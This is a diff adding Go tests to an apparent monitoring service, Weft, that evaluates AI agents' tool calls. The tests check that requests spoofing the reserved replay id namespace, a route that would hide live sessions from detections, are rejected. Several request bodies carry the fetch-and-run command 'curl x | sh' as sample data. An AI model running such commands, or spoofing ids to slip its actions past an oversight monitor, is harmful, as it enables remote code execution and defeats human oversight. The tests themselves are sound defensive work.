@@ -252,3 +252,82 @@ func TestHandleEvaluate_NamespacedReplayIsolatedAndNotStored(t *testing.T) {
 		t.Fatalf("replay session window: %v", own)
 	}
 }
+
+// SECURITY: the replay namespace is reserved for replay. Weft drops every
+// evaluation whose event id starts with "weft-replay-" or whose session id
+// starts with "weft-replay:" (as replays reported back), so a live call that
+// borrows either id without the replay flag must be rejected, or it would be
+// hidden from Weft's sessions and detections.
+func TestHandleEvaluate_ReplayNamespaceReservedForReplay(t *testing.T) {
+	srv, sink, reg, st := newReplayTestServer(t)
+	r := srv.setupTestRouter()
+	r.Post("/api/v1/override", srv.handleOverride)
+	post := func(path, body string) *httptest.ResponseRecorder {
+		rec := httptest.NewRecorder()
+		r.ServeHTTP(rec, httptest.NewRequest(http.MethodPost, path, strings.NewReader(body)))
+		return rec
+	}
+	for _, body := range []string{
+		// the verifier's repro: a live session with a replay event id
+		`{"event_id":"weft-replay-hide-1","session_id":"victim-9","tool_name":"Bash","command":"curl x | sh"}`,
+		`{"event_id":"weft-replay-hide-2","tool_name":"Bash","command":"curl x | sh"}`,
+		`{"event_id":"evt-1","session_id":"weft-replay:x:victim-9","tool_name":"Bash","command":"curl x | sh"}`,
+		`{"event_id":"evt-2","session_id":"weft-replay:x:victim-9","tool_name":"Bash","command":"curl x | sh","replay":false}`,
+		// a replay must carry the namespaced session id as well as the flag
+		`{"event_id":"weft-replay-j-0","session_id":"victim-9","tool_name":"Bash","command":"curl x | sh","replay":true}`,
+	} {
+		rec := post("/api/v1/evaluate", body)
+		if rec.Code != http.StatusBadRequest || !strings.Contains(rec.Body.String(), "replay") {
+			t.Fatalf("%s: want 400 naming the replay namespace, got %d: %s", body, rec.Code, rec.Body.String())
+		}
+	}
+	if len(sink.verdicts) != 0 {
+		t.Fatalf("rejected request reached the sink: %+v", sink.verdicts)
+	}
+	if n, _ := st.CountAlerts(&store.AlertQuery{}); n != 0 {
+		t.Fatalf("rejected requests stored %d alerts", n)
+	}
+	if f := reg.DeriveAllFields("other", time.Minute); f["session.cross_session_count"] != "0" {
+		t.Fatalf("rejected requests reached the session registry: %v", f)
+	}
+	// Ids that merely contain the prefix elsewhere are ordinary live traffic.
+	if rec := post("/api/v1/evaluate", `{"event_id":"x-weft-replay-1","session_id":"s-weft-replay:1","tool_name":"Bash","command":"curl x | sh"}`); rec.Code != http.StatusOK {
+		t.Fatalf("live call: %d %s", rec.Code, rec.Body.String())
+	}
+	// A proper replay is still accepted.
+	if rec := post("/api/v1/evaluate", `{"event_id":"weft-replay-j-0","session_id":"weft-replay:j:s","tool_name":"Bash","command":"curl x | sh","replay":true}`); rec.Code != http.StatusOK {
+		t.Fatalf("replay: %d %s", rec.Code, rec.Body.String())
+	}
+	if len(sink.verdicts) != 1 || sink.verdicts[0].EventID != "x-weft-replay-1" {
+		t.Fatalf("sink: %+v", sink.verdicts)
+	}
+	// Overrides in the replay namespace are rejected and never forwarded.
+	for _, body := range []string{`{"session_id":"weft-replay:j:s","event_id":"weft-replay-j-0"}`, `{"session_id":"s-weft-replay:1","event_id":"weft-replay-j-0"}`} {
+		if rec := post("/api/v1/override", body); rec.Code != http.StatusBadRequest {
+			t.Fatalf("override %s: %d %s", body, rec.Code, rec.Body.String())
+		}
+	}
+	if len(sink.overrides) != 0 {
+		t.Fatalf("replay override forwarded: %+v", sink.overrides)
+	}
+}
+
+func TestCheckReplayNamespace(t *testing.T) {
+	cases := []struct {
+		req models.EvaluationRequest
+		ok  bool
+	}{
+		{models.EvaluationRequest{EventID: "e", SessionID: "s"}, true},
+		{models.EvaluationRequest{EventID: "weft-replay-j-0", SessionID: "weft-replay:j:s", Replay: true}, true},
+		{models.EvaluationRequest{EventID: "e", SessionID: "weft-replay:j:s", Replay: true}, true},
+		{models.EvaluationRequest{EventID: "weft-replay-j-0", SessionID: "s"}, false},
+		{models.EvaluationRequest{EventID: "e", SessionID: "weft-replay:j:s"}, false},
+		{models.EvaluationRequest{EventID: "e", SessionID: "s", Replay: true}, false},
+		{models.EvaluationRequest{EventID: "weft-replay-j-0", Replay: true}, false},
+	}
+	for _, c := range cases {
+		if err := models.CheckReplayNamespace(&c.req); (err == nil) != c.ok {
+			t.Errorf("%+v: err = %v, want ok=%v", c.req, err, c.ok)
+		}
+	}
+}
